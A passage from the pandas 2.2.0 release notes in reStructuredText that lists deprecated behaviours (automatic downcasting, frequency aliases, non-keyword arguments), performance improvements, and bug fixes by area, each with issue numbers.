freq='QE-NOV')\n\nDeprecated automatic downcasting\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nDeprecated the automatic downcasting of object dtype results in a number of\nmethods. These would silently change the dtype in a hard to predict manner since the\nbehavior was value dependent. Additionally, pandas is moving away from silent dtype\nchanges (:issue:`54710`, :issue:`54261`).\n\nThese methods are:\n\n- :meth:`Series.replace` and :meth:`DataFrame.replace`\n- :meth:`DataFrame.fillna`, :meth:`Series.fillna`\n- :meth:`DataFrame.ffill`, :meth:`Series.ffill`\n- :meth:`DataFrame.bfill`, :meth:`Series.bfill`\n- :meth:`DataFrame.mask`, :meth:`Series.mask`\n- :meth:`DataFrame.where`, :meth:`Series.where`\n- :meth:`DataFrame.clip`, :meth:`Series.clip`\n\nExplicitly call :meth:`DataFrame.infer_objects` to replicate the current behavior in the future.\n\n.. code-block:: ipython\n\n    result = result.infer_objects(copy=False)\n\nOr explicitly cast all-round floats to ints using ``astype``.\n\nSet the following option to opt into the future behavior:\n\n.. code-block:: ipython\n\n    In [9]: pd.set_option(\"future.no_silent_downcasting\", True)\n\nOther Deprecations\n^^^^^^^^^^^^^^^^^^\n- Changed :meth:`Timedelta.resolution_string` to return ``h``, ``min``, ``s``, ``ms``, ``us``, and ``ns`` instead of ``H``, ``T``, ``S``, ``L``, ``U``, and ``N``, for compatibility with respective deprecations in frequency aliases (:issue:`52536`)\n- Deprecated :attr:`offsets.Day.delta`, :attr:`offsets.Hour.delta`, :attr:`offsets.Minute.delta`, :attr:`offsets.Second.delta`, :attr:`offsets.Milli.delta`, :attr:`offsets.Micro.delta`, :attr:`offsets.Nano.delta`, use ``pd.Timedelta(obj)`` instead (:issue:`55498`)\n- Deprecated :func:`pandas.api.types.is_interval` and :func:`pandas.api.types.is_period`, use ``isinstance(obj, pd.Interval)`` and ``isinstance(obj, pd.Period)`` instead (:issue:`55264`)\n- Deprecated :func:`read_gbq` and :meth:`DataFrame.to_gbq`. Use ``pandas_gbq.read_gbq`` and ``pandas_gbq.to_gbq`` instead https://pandas-gbq.readthedocs.io/en/latest/api.html (:issue:`55525`)\n- Deprecated :meth:`.DataFrameGroupBy.fillna` and :meth:`.SeriesGroupBy.fillna`; use :meth:`.DataFrameGroupBy.ffill`, :meth:`.DataFrameGroupBy.bfill` for forward and backward filling or :meth:`.DataFrame.fillna` to fill with a single value (or the Series equivalents) (:issue:`55718`)\n- Deprecated :meth:`DateOffset.is_anchored`, use ``obj.n == 1`` for non-Tick subclasses (for Tick this was always False) (:issue:`55388`)\n- Deprecated :meth:`DatetimeArray.__init__` and :meth:`TimedeltaArray.__init__`, use :func:`array` instead (:issue:`55623`)\n- Deprecated :meth:`Index.format`, use ``index.astype(str)`` or ``index.map(formatter)`` instead (:issue:`55413`)\n- Deprecated :meth:`Series.ravel`, the underlying array is already 1D, so ravel is not necessary (:issue:`52511`)\n- Deprecated :meth:`Series.resample` and :meth:`DataFrame.resample` with a :class:`PeriodIndex` (and the 'convention' keyword), convert to :class:`DatetimeIndex` (with ``.to_timestamp()``) before resampling instead (:issue:`53481`)\n- Deprecated :meth:`Series.view`, use :meth:`Series.astype` instead to change the dtype (:issue:`20251`)\n- Deprecated :meth:`offsets.Tick.is_anchored`, use ``False`` instead (:issue:`55388`)\n- Deprecated ``core.internals`` members ``Block``, ``ExtensionBlock``, and ``DatetimeTZBlock``, use public APIs instead (:issue:`55139`)\n- Deprecated ``year``, ``month``, ``quarter``, ``day``, ``hour``, ``minute``, and ``second`` keywords in the :class:`PeriodIndex` constructor, use :meth:`PeriodIndex.from_fields` instead (:issue:`55960`)\n- Deprecated accepting a type as an argument in :meth:`Index.view`, call without any arguments instead (:issue:`55709`)\n- Deprecated allowing non-integer ``periods`` argument in :func:`date_range`, :func:`timedelta_range`, :func:`period_range`, and :func:`interval_range` (:issue:`56036`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_clipboard` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_csv` except ``path_or_buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_dict` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_excel` except ``excel_writer`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_gbq` except ``destination_table`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_hdf` except ``path_or_buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_html` except ``buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_json` except ``path_or_buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_latex` except ``buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_markdown` except ``buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_parquet` except ``path`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_pickle` except ``path`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_string` except ``buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_xml` except ``path_or_buffer`` (:issue:`54229`)\n- Deprecated allowing passing :class:`BlockManager` objects to :class:`DataFrame` or :class:`SingleBlockManager` objects to :class:`Series` (:issue:`52419`)\n- Deprecated behavior of :meth:`Index.insert` with an object-dtype index silently performing type inference on the result, explicitly call ``result.infer_objects(copy=False)`` for the old behavior instead (:issue:`51363`)\n- Deprecated casting non-datetimelike values (mainly strings) in :meth:`Series.isin` and :meth:`Index.isin` with ``datetime64``, ``timedelta64``, and :class:`PeriodDtype` dtypes (:issue:`53111`)\n- Deprecated dtype inference in :class:`Index`, :class:`Series` and :class:`DataFrame` constructors when giving a pandas input, call ``.infer_objects`` on the input to keep the current behavior (:issue:`56012`)\n- Deprecated dtype inference when setting a :class:`Index` into a :class:`DataFrame`, cast explicitly instead (:issue:`56102`)\n- Deprecated including the groups in computations when using :meth:`.DataFrameGroupBy.apply` and :meth:`.DataFrameGroupBy.resample`; pass ``include_groups=False`` to exclude the groups (:issue:`7155`)\n- Deprecated indexing an :class:`Index`  with a boolean indexer of length zero (:issue:`55820`)\n- Deprecated not passing a tuple to :class:`.DataFrameGroupBy.get_group` or :class:`.SeriesGroupBy.get_group` when grouping by a length-1 list-like (:issue:`25971`)\n- Deprecated string ``AS`` denoting frequency in :class:`YearBegin` and strings ``AS-DEC``, ``AS-JAN``, etc. denoting annual frequencies with various fiscal year starts (:issue:`54275`)\n- Deprecated string ``A`` denoting frequency in :class:`YearEnd` and strings ``A-DEC``, ``A-JAN``, etc. denoting annual frequencies with various fiscal year ends (:issue:`54275`)\n- Deprecated string ``BAS`` denoting frequency in :class:`BYearBegin` and strings ``BAS-DEC``, ``BAS-JAN``, etc. denoting annual frequencies with various fiscal year starts (:issue:`54275`)\n- Deprecated string ``BA`` denoting frequency in :class:`BYearEnd` and strings ``BA-DEC``, ``BA-JAN``, etc. denoting annual frequencies with various fiscal year ends (:issue:`54275`)\n- Deprecated strings ``H``, ``BH``, and ``CBH`` denoting frequencies in :class:`Hour`, :class:`BusinessHour`, :class:`CustomBusinessHour` (:issue:`52536`)\n- Deprecated strings ``H``, ``S``, ``U``, and ``N`` denoting units in :func:`to_timedelta` (:issue:`52536`)\n- Deprecated strings ``H``, ``T``, ``S``, ``L``, ``U``, and ``N`` denoting units in :class:`Timedelta` (:issue:`52536`)\n- Deprecated strings ``T``, ``S``, ``L``, ``U``, and ``N`` denoting frequencies in :class:`Minute`, :class:`Second`, :class:`Milli`, :class:`Micro`, :class:`Nano` (:issue:`52536`)\n- Deprecated support for combining parsed datetime columns in :func:`read_csv` along with the ``keep_date_col`` keyword (:issue:`55569`)\n- Deprecated the :attr:`.DataFrameGroupBy.grouper` and :attr:`SeriesGroupBy.grouper`; these attributes will be removed in a future version of pandas (:issue:`56521`)\n- Deprecated the :class:`.Grouping` attributes ``group_index``, ``result_index``, and ``group_arraylike``; these will be removed in a future version of pandas (:issue:`56148`)\n- Deprecated the ``delim_whitespace`` keyword in :func:`read_csv` and :func:`read_table`, use ``sep=\"\\\\s+\"`` instead (:issue:`55569`)\n- Deprecated the ``errors=\"ignore\"`` option in :func:`to_datetime`, :func:`to_timedelta`, and :func:`to_numeric`; explicitly catch exceptions instead (:issue:`54467`)\n- Deprecated the ``fastpath`` keyword in the :class:`Series` constructor (:issue:`20110`)\n- Deprecated the ``kind`` keyword in :meth:`Series.resample` and :meth:`DataFrame.resample`, explicitly cast the object's ``index`` instead (:issue:`55895`)\n- Deprecated the ``ordinal`` keyword in :class:`PeriodIndex`, use :meth:`PeriodIndex.from_ordinals` instead (:issue:`55960`)\n- Deprecated the ``unit`` keyword in :class:`TimedeltaIndex` construction, use :func:`to_timedelta` instead (:issue:`55499`)\n- Deprecated the ``verbose`` keyword in :func:`read_csv` and :func:`read_table` (:issue:`55569`)\n- Deprecated the behavior of :meth:`DataFrame.replace` and :meth:`Series.replace` with :class:`CategoricalDtype`; in a future version replace will change the values while preserving the categories. To change the categories, use ``ser.cat.rename_categories`` instead (:issue:`55147`)\n- Deprecated the behavior of :meth:`Series.value_counts` and :meth:`Index.value_counts` with object dtype; in a future version these will not perform dtype inference on the resulting :class:`Index`, do ``result.index = result.index.infer_objects()`` to retain the old behavior (:issue:`56161`)\n- Deprecated the default of ``observed=False`` in :meth:`DataFrame.pivot_table`; will be ``True`` in a future version (:issue:`56236`)\n- Deprecated the extension test classes ``BaseNoReduceTests``, ``BaseBooleanReduceTests``, and ``BaseNumericReduceTests``, use ``BaseReduceTests`` instead (:issue:`54663`)\n- Deprecated the option ``mode.data_manager`` and the ``ArrayManager``; only the ``BlockManager`` will be available in future versions (:issue:`55043`)\n- Deprecated the previous implementation of :class:`DataFrame.stack`; specify ``future_stack=True`` to adopt the future version (:issue:`53515`)\n-\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_220.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement in :func:`.testing.assert_frame_equal` and :func:`.testing.assert_series_equal` (:issue:`55949`, :issue:`55971`)\n- Performance improvement in :func:`concat` with ``axis=1`` and objects with unaligned indexes (:issue:`55084`)\n- Performance improvement in :func:`get_dummies` (:issue:`56089`)\n- Performance improvement in :func:`merge` and :func:`merge_ordered` when joining on sorted ascending keys (:issue:`56115`)\n- Performance improvement in :func:`merge_asof` when ``by`` is not ``None`` (:issue:`55580`, :issue:`55678`)\n- Performance improvement in :func:`read_stata` for files with many variables (:issue:`55515`)\n- Performance improvement in :meth:`DataFrame.groupby` when aggregating pyarrow timestamp and duration dtypes (:issue:`55031`)\n- Performance improvement in :meth:`DataFrame.join` when joining on unordered categorical indexes (:issue:`56345`)\n- Performance improvement in :meth:`DataFrame.loc` and :meth:`Series.loc` when indexing with a :class:`MultiIndex` (:issue:`56062`)\n- Performance improvement in :meth:`DataFrame.sort_index` and :meth:`Series.sort_index` when indexed by a :class:`MultiIndex` (:issue:`54835`)\n- Performance improvement in :meth:`DataFrame.to_dict` on converting DataFrame to dictionary (:issue:`50990`)\n- Performance improvement in :meth:`Index.difference` (:issue:`55108`)\n- Performance improvement in :meth:`Index.sort_values` when index is already sorted (:issue:`56128`)\n- Performance improvement in :meth:`MultiIndex.get_indexer` when ``method`` is not ``None`` (:issue:`55839`)\n- Performance improvement in :meth:`Series.duplicated` for pyarrow dtypes (:issue:`55255`)\n- Performance improvement in :meth:`Series.str.get_dummies` when dtype is ``\"string[pyarrow]\"`` or ``\"string[pyarrow_numpy]\"`` (:issue:`56110`)\n- Performance improvement in :meth:`Series.str` methods (:issue:`55736`)\n- Performance improvement in :meth:`Series.value_counts` and :meth:`Series.mode` for masked dtypes (:issue:`54984`, :issue:`55340`)\n- Performance improvement in :meth:`.DataFrameGroupBy.nunique` and :meth:`.SeriesGroupBy.nunique` (:issue:`55972`)\n- Performance improvement in :meth:`.SeriesGroupBy.idxmax`, :meth:`.SeriesGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.DataFrameGroupBy.idxmin` (:issue:`54234`)\n- Performance improvement when hashing a nullable extension array (:issue:`56507`)\n- Performance improvement when indexing into a non-unique index (:issue:`55816`)\n- Performance improvement when indexing with more than 4 keys (:issue:`54550`)\n- Performance improvement when localizing time to UTC (:issue:`55241`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_220.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- :meth:`Categorical.isin` raising ``InvalidIndexError`` for categorical containing overlapping :class:`Interval` values (:issue:`34974`)\n- Bug in :meth:`CategoricalDtype.__eq__` returning ``False`` for unordered categorical data with mixed types (:issue:`55468`)\n- Bug when casting ``pa.dictionary`` to :class:`CategoricalDtype` using a ``pa.DictionaryArray`` as categories (:issue:`56672`)\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :class:`DatetimeIndex` construction when passing both a ``tz`` and either ``dayfirst`` or ``yearfirst`` ignoring dayfirst/yearfirst (:issue:`55813`)\n- Bug in :class:`DatetimeIndex` when passing an object-dtype ndarray of float objects and a ``tz`` incorrectly localizing the result (:issue:`55780`)\n- Bug in :func:`Series.isin` with :class:`DatetimeTZDtype` dtype and comparison values that are all ``NaT`` incorrectly returning all-``False`` even if the series contains ``NaT`` entries (:issue:`56427`)\n- Bug in :func:`concat` raising ``AttributeError`` when concatenating all-NA DataFrame with :class:`DatetimeTZDtype` dtype DataFrame (:issue:`52093`)\n- Bug in :func:`testing.assert_extension_array_equal` that could use the wrong unit when comparing resolutions (:issue:`55730`)\n- Bug in :func:`to_datetime` and :class:`DatetimeIndex` when passing a list of mixed-string-and-numeric types incorrectly raising (:issue:`55780`)\n- Bug in :func:`to_datetime` and :class:`DatetimeIndex` when passing mixed-type objects with a mix of timezones or mix of timezone-awareness failing to raise ``ValueError`` (:issue:`55693`)\n- Bug in :meth:`.Tick.delta` with very large ticks raising ``OverflowError`` instead of ``OutOfBoundsTimedelta`` (:issue:`55503`)\n- Bug in :meth:`DatetimeIndex.shift` with non-nanosecond resolution incorrectly returning with nanosecond resolution (:issue:`56117`)\n- Bug in :meth:`DatetimeIndex.union` returning object dtype for tz-aware indexes with the same timezone but different units (:issue:`55238`)\n- Bug in :meth:`Index.is_monotonic_increasing` and :meth:`Index.is_monotonic_decreasing` always caching :meth:`Index.is_unique` as ``True`` when first value in index is ``NaT`` (:issue:`55755`)\n- Bug in :meth:`Index.view` to a datetime64 dtype with non-supported resolution incorrectly raising (:issue:`55710`)\n- Bug in :meth:`Series.dt.round` with non-nanosecond resolution and ``NaT`` entries incorrectly raising ``OverflowError`` (:issue:`56158`)\n- Bug in :meth:`Series.fillna` with non-nanosecond resolution dtypes and higher-resolution vector values returning incorrect (internally-corrupted) results (:issue:`56410`)\n- Bug in :meth:`Timestamp.unit` being inferred incorrectly from an ISO8601 format string with minute or hour resolution and a timezone offset (:issue:`56208`)\n- Bug in ``.astype`` converting from a higher-resolution ``datetime64`` dtype to a lower-resolution ``datetime64`` dtype (e.g. ``datetime64[us]->datetime64[ms]``) silently overflowing with values near the lower implementation bound (:issue:`55979`)\n- Bug in adding or subtracting a :class:`Week` offset to a ``datetime64`` :class:`Series`, :class:`Index`, or :class:`DataFrame` column with non-nanosecond resolution returning incorrect results (:issue:`55583`)\n- Bug in addition or subtraction of :class:`BusinessDay` offset with ``offset`` attribute to non-nanosecond :class:`Index`, :class:`Series`, or :class:`DataFrame` column giving incorrect results (:issue:`55608`)\n- Bug in addition or subtraction of :class:`DateOffset` objects with microsecond components to ``datetime64`` :class:`Index`, :class:`Series`, or :class:`DataFrame` columns with non-nanosecond resolution (:issue:`55595`)\n- Bug in addition or subtraction of very large :class:`.Tick` objects with :class:`Timestamp` or :class:`Timedelta` objects raising ``OverflowError`` instead of ``OutOfBoundsTimedelta`` (:issue:`55503`)\n- Bug in creating a :class:`Index`, :class:`Series`, or :class:`DataFrame` with a non-nanosecond :class:`DatetimeTZDtype` and inputs that would be out of bounds with nanosecond resolution incorrectly raising ``OutOfBoundsDatetime`` (:issue:`54620`)\n- Bug in creating a :class:`Index`, :class:`Series`, or :class:`DataFrame` with a non-nanosecond ``datetime64`` (or :class:`DatetimeTZDtype`) from mixed-numeric inputs treating those as nanoseconds instead of as multiples of the dtype's unit (which would happen with non-mixed numeric inputs) (:issue:`56004`)\n- Bug in creating a :class:`Index`, :class:`Series`, or :class:`DataFrame` with a non-nanosecond ``datetime64`` dtype and inputs that would be out of bounds for a ``datetime64[ns]`` incorrectly raising ``OutOfBoundsDatetime`` (:issue:`55756`)\n- Bug in parsing datetime strings with nanosecond resolution with non-ISO8601 formats incorrectly truncating sub-microsecond components (:issue:`56051`)\n- Bug in parsing datetime strings with sub-second resolution and trailing zeros incorrectly inferring second or millisecond resolution (:issue:`55737`)\n- Bug in the results of :func:`to_datetime` with an floating-dtype argument with ``unit`` not matching the pointwise results of :class:`Timestamp` (:issue:`56037`)\n- Fixed regression where :func:`concat` would raise an error when concatenating ``datetime64`` columns with differing resolutions (:issue:`53641`)\n\nTimedelta\n^^^^^^^^^\n- Bug in :class:`Timedelta` construction raising ``OverflowError`` instead of ``OutOfBoundsTimedelta`` (:issue:`55503`)\n- Bug in rendering (``__repr__``) of :class:`TimedeltaIndex` and :class:`Series` with timedelta64 values with non-nanosecond resolution entries that are all multiples of 24 hours failing to use the compact representation used in the nanosecond cases (:issue:`55405`)\n\nTimezones\n^^^^^^^^^\n- Bug in :class:`AbstractHolidayCalendar` where timezone data was not propagated when computing holiday observances (:issue:`54580`)\n- Bug in :class:`Timestamp` construction with an ambiguous value and a ``pytz`` timezone failing to raise ``pytz.AmbiguousTimeError`` (:issue:`55657`)\n- Bug in :meth:`Timestamp.tz_localize` with ``nonexistent=\"shift_forward`` around UTC+0 during DST (:issue:`51501`)\n\nNumeric\n^^^^^^^\n- Bug in :func:`read_csv` with ``engine=\"pyarrow\"`` causing rounding errors for large integers (:issue:`52505`)\n- Bug in :meth:`Series.__floordiv__` and :meth:`Series.__truediv__` for :class:`ArrowDtype` with integral dtypes raising for large divisors (:issue:`56706`)\n- Bug in :meth:`Series.__floordiv__` for :class:`ArrowDtype` with integral dtypes raising for large values (:issue:`56645`)\n- Bug in :meth:`Series.pow` not filling missing values correctly (:issue:`55512`)\n- Bug in :meth:`Series.replace` and :meth:`DataFrame.replace` matching float ``0.0`` with ``False`` and vice versa (:issue:`55398`)\n- Bug in :meth:`Series.round` raising for nullable boolean dtype (:issue:`55936`)\n\nConversion\n^^^^^^^^^^\n- Bug in :meth:`DataFrame.astype` when called with ``str`` on unpickled array - the array might change in-place (:issue:`54654`)\n- Bug in :meth:`DataFrame.astype` where ``errors=\"ignore\"`` had no effect for extension types (:issue:`54654`)\n- Bug in :meth:`Series.convert_dtypes` not converting all NA column to ``null[pyarrow]`` (:issue:`55346`)\n- Bug in :meth:``DataFrame.loc`` was not throwing \"incompatible dtype warning\" (see `PDEP6 <https://pandas.pydata.org/pdeps/0006-ban-upcasting.html>`_) when assigning a ``Series`` with a different dtype using a full column setter (e.g. ``df.loc[:, 'a'] = incompatible_value``) (:issue:`39584`)\n\nStrings\n^^^^^^^\n- Bug in :func:`pandas.api.types.is_string_dtype` while checking object array with no elements is of the string dtype (:issue:`54661`)\n- Bug in :meth:`DataFrame.apply` failing when ``engine=\"numba\"`` and columns or index have ``StringDtype`` (:issue:`56189`)\n- Bug in :meth:`DataFrame.reindex` not matching :class:`Index` with ``string[pyarrow_numpy]`` dtype (:issue:`56106`)\n- Bug in :meth:`Index.str.cat` always casting result to object dtype (:issue:`56157`)\n- Bug in :meth:`Series.__mul__` for :class:`ArrowDtype` with ``pyarrow.string`` dtype and ``string[pyarrow]`` for the pyarrow backend (:issue:`51970`)\n- Bug in :meth:`Series.str.find` when ``start < 0`` for :class:`ArrowDtype` with ``pyarrow.string`` (:issue:`56411`)\n- Bug in :meth:`Series.str.fullmatch` when ``dtype=pandas.ArrowDtype(pyarrow.string()))`` allows partial matches when regex ends in literal //$ (:issue:`56652`)\n- Bug in :meth:`Series.str.replace` when ``n < 0`` for :class:`ArrowDtype` with ``pyarrow.string`` (:issue:`56404`)\n- Bug in :meth:`Series.str.startswith` and :meth:`Series.str.endswith` with arguments of type ``tuple[str, ...]`` for :class:`ArrowDtype` with ``pyarrow.string`` dtype (:issue:`56579`)\n- Bug in :meth:`Series.str.startswith` and :meth:`Series.str.endswith` with arguments of type ``tuple[str, ...]`` for ``string[pyarrow]`` (:issue:`54942`)\n- Bug in comparison operations for ``dtype=\"string[pyarrow_numpy]\"`` raising if dtypes can't be compared (:issue:`56008`)\n\nInterval\n^^^^^^^^\n- Bug in :class:`Interval` ``__repr__`` not displaying UTC offsets for :class:`Timestamp` bounds. Additionally the hour, minute and second components will now be shown (:issue:`55015`)\n- Bug in :meth:`IntervalIndex.factorize` and :meth:`Series.factorize` with :class:`IntervalDtype` with datetime64 or timedelta64 intervals not preserving non-nanosecond units (:issue:`56099`)\n- Bug in :meth:`IntervalIndex.from_arrays` when passed ``datetime64`` or ``timedelta64`` arrays with mismatched resolutions constructing an invalid ``IntervalArray`` object (:issue:`55714`)\n- Bug in :meth:`IntervalIndex.from_tuples` raising if subtype is a nullable extension dtype (:issue:`56765`)\n- Bug in :meth:`IntervalIndex.get_indexer` with datetime or timedelta intervals incorrectly matching on integer targets (:issue:`47772`)\n- Bug in :meth:`IntervalIndex.get_indexer` with timezone-aware datetime intervals incorrectly matching on a sequence of timezone-naive targets (:issue:`47772`)\n- Bug in setting values on a :class:`Series` with an :class:`IntervalIndex` using a slice incorrectly raising (:issue:`54722`)\n\nIndexing\n^^^^^^^^\n- Bug in :meth:`DataFrame.loc` mutating a boolean indexer when :class:`DataFrame` has a :class:`MultiIndex` (:issue:`56635`)\n- Bug in :meth:`DataFrame.loc` when setting :class:`Series` with extension dtype into NumPy dtype (:issue:`55604`)\n- Bug in :meth:`Index.difference` not returning a unique set of values when ``other`` is empty or ``other`` is considered non-comparable (:issue:`55113`)\n- Bug in setting :class:`Categorical` values into a :class:`DataFrame` with numpy dtypes raising ``RecursionError`` (:issue:`52927`)\n- Fixed bug when creating new column with missing values when setting a single string value (:issue:`56204`)\n\nMissing\n^^^^^^^\n- Bug in :meth:`DataFrame.update` wasn't updating in-place for tz-aware datetime64 dtypes (:issue:`56227`)\n\nMultiIndex\n^^^^^^^^^^\n- Bug in :meth:`MultiIndex.get_indexer` not raising ``ValueError`` when ``method`` provided and index is non-monotonic (:issue:`53452`)\n\nI/O\n^^^\n- Bug in :func:`read_csv` where ``engine=\"python\"`` did not respect ``chunksize`` arg when ``skiprows`` was specified (:issue:`56323`)\n- Bug in :func:`read_csv` where ``engine=\"python\"`` was causing a ``TypeError`` when a callable ``skiprows`` and a chunk size was specified (:issue:`55677`)\n- Bug in :func:`read_csv` where ``on_bad_lines=\"warn\"`` would write to ``stderr`` instead of raising a Python warning; this now yields a :class:`.errors.ParserWarning` (:issue:`54296`)\n- Bug in :func:`read_csv` with ``engine=\"pyarrow\"`` where ``quotechar`` was ignored (:issue:`52266`)\n- Bug in :func:`read_csv` with ``engine=\"pyarrow\"`` where ``usecols`` wasn't working with a CSV with no headers (:issue:`54459`)\n- Bug in :func:`read_excel`, with ``engine=\"xlrd\"`` (``xls`` files) erroring when the file contains ``NaN`` or ``Inf`` (:issue:`54564`)\n- Bug in :func:`read_json` not handling dtype conversion properly if ``infer_string`` is set (:issue:`56195`)\n- Bug in :meth:`DataFrame.to_excel`, with ``OdsWriter`` (``ods`` files) writing Boolean/string value (:issue:`54994`)\n- Bug in :meth:`DataFrame.to_hdf` and :func:`read_hdf` with ``datetime64`` dtypes with non-nanosecond resolution failing to round-trip correctly (:issue:`55622`)\n- Bug in :meth:`DataFrame.to_stata` raising for extension dtypes (:issue:`54671`)\n- Bug in :meth:`~pandas.read_excel` with ``engine=\"odf\"`` (``ods`` files) when a string cell contains an annotation (:issue:`55200`)\n- Bug in :meth:`~pandas.read_excel` with an ODS file without cached formatted cell for float values (:issue:`55219`)\n- Bug where :meth:`DataFrame.to_json` would raise an ``OverflowError`` instead of a ``TypeError`` with unsupported NumPy types (:issue:`55403`)\n\nPeriod\n^^^^^^\n- Bug in :class:`PeriodIndex` construction when more than one of ``data``, ``ordinal`` and ``**fields`` are passed failing to raise ``ValueError`` (:issue:`55961`)\n- Bug in :class:`Period` addition silently wrapping around instead of raising ``OverflowError`` (:issue:`55503`)\n- Bug in casting from :class:`PeriodDtype` with ``astype`` to ``datetime64`` or :class:`DatetimeTZDtype` with non-nanosecond unit incorrectly returning with nanosecond unit (:issue:`55958`)\n\nPlotting\n^^^^^^^^\n- Bug in :meth:`DataFrame.plot.box` with ``vert=False`` and a Matplotlib ``Axes`` created with ``sharey=True`` (:issue:`54941`)\n- Bug in :meth:`DataFrame.plot.scatter` discarding string columns (:issue:`56142`)\n- Bug in :meth:`Series.plot` when reusing an ``ax`` object failing to raise when a ``how`` keyword is passed (:issue:`55953`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n- Bug in :meth:`.DataFrameGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.SeriesGroupBy.idxmin`, and :meth:`.SeriesGroupBy.idxmax` would not retain :class:`.Categorical` dtype when the index was a :class:`.CategoricalIndex` that contained NA values (:issue:`54234`)\n- Bug in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` when ``observed=False`` and ``f=\"idxmin\"`` or ``f=\"idxmax\"`` would incorrectly raise on unobserved categories (:issue:`54234`)\n- Bug in :meth:`.DataFrameGroupBy.value_counts` and :meth:`.SeriesGroupBy.value_counts` could result in incorrect sorting if the columns of the DataFrame or name of the Series are integers (:issue:`55951`)\n- Bug in :meth:`.DataFrameGroupBy.value_counts` and :meth:`.SeriesGroupBy.value_counts` would not respect ``sort=False`` in :meth:`DataFrame.groupby` and :meth:`Series.groupby` (:issue:`55951`)\n- Bug in :meth:`.DataFrameGroupBy.value_counts` and :meth:`.SeriesGroupBy.value_counts` would sort by proportions rather than frequencies when ``sort=True`` and ``normalize=True`` (:issue:`55951`)\n- Bug in :meth:`DataFrame.asfreq` and :meth:`Series.asfreq` with a :class:`DatetimeIndex` with non-nanosecond resolution incorrectly converting to nanosecond resolution (:issue:`55958`)\n- Bug in :meth:`DataFrame.ewm` when passed ``times`` with non-nanosecond ``datetime64`` or :class:`DatetimeTZDtype` dtype (:issue:`56262`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` where grouping by a combination of ``Decimal`` and NA values would fail when ``sort=True`` (:issue:`54847`)\n- Bug in :meth:`DataFrame.groupby` for DataFrame subclasses when selecting a subset of columns to apply the function to (:issue:`56761`)\n- Bug in :meth:`DataFrame.resample` not respecting ``closed`` and ``label`` arguments for :class:`~pandas.tseries.offsets.BusinessDay` (:issue:`55282`)\n- Bug in :meth:`DataFrame.resample` when resampling on a :class:`ArrowDtype` of ``pyarrow.timestamp`` or ``pyarrow.duration`` type (:issue:`55989`)\n- Bug in :meth:`DataFrame.resample` where bin edges were not correct for :class:`~pandas.tseries.offsets.BusinessDay` (:issue:`55281`)\n- Bug in :meth:`DataFrame.resample` where bin edges were not correct for :class:`~pandas.tseries.offsets.MonthBegin` (:issue:`55271`)\n- Bug in :meth:`DataFrame.rolling` and :meth:`Series.rolling` where duplicate datetimelike indexes are treated as consecutive rather than equal with ``closed='left'`` and ``closed='neither'`` (:issue:`20712`)\n- Bug in :meth:`DataFrame.rolling` and :meth:`Series.rolling` where either the ``index`` or ``on`` column was :class:`ArrowDtype` with ``pyarrow.timestamp`` type (:issue:`55849`)\n\nReshaping\n^^^^^^^^^\n- Bug in :func:`concat` ignoring ``sort`` parameter when passed :class:`DatetimeIndex` indexes (:issue:`54769`)\n- Bug in :func:`concat` renaming :class:`Series` when ``ignore_index=False`` (:issue:`15047`)\n- Bug in :func:`merge_asof` raising ``TypeError`` when ``by`` dtype is not ``object``, ``int64``, or ``uint64`` (:issue:`22794`)\n- Bug in :func:`merge_asof` raising incorrect error for string dtype (:issue:`56444`)\n- Bug in :func:`merge_asof` when using a :class:`Timedelta` tolerance on a :class:`ArrowDtype` column (:issue:`56486`)\n- Bug in :func:`merge` not raising when merging datetime columns with timedelta columns (:issue:`56455`)\n- Bug in :func:`merge` not raising when merging string columns with numeric columns (:issue:`56441`)\n- Bug in :func:`merge` not sorting for new string dtype (:issue:`56442`)\n- Bug in :func:`merge` returning columns in incorrect order when left and/or right is empty (:issue:`51929`)\n- Bug in :meth:`DataFrame.melt` where an exception was raised if ``var_name`` was not a string (:issue:`55948`)\n- Bug in :meth:`DataFrame.melt` where it would not preserve the datetime (:issue:`55254`)\n- Bug in :meth:`DataFrame.pivot_table` where the row margin is incorrect when the columns have numeric names (:issue:`26568`)\n- Bug in :meth:`DataFrame.pivot` with numeric columns and extension dtype for data (:issue:`56528`)\n- Bug in :meth:`DataFrame.stack` with ``future_stack=True`` would not preserve NA values in the index (:issue:`56573`)\n\nSparse\n^^^^^^\n- Bug in :meth:`arrays.SparseArray.take` when using a different fill value than the array's fill value (:issue:`55181`)\n\nOther\n^^^^^\n- :meth:`DataFrame.__dataframe__` did not support pyarrow large strings (:issue:`56702`)\n- Bug in :func:`DataFrame.describe` when formatting percentiles in the resulting percentile 99.999% is rounded to 100% (:issue:`55765`)\n- Bug in :func:`api.interchange.from_dataframe` where it raised  ``NotImplementedError`` when handling empty string columns 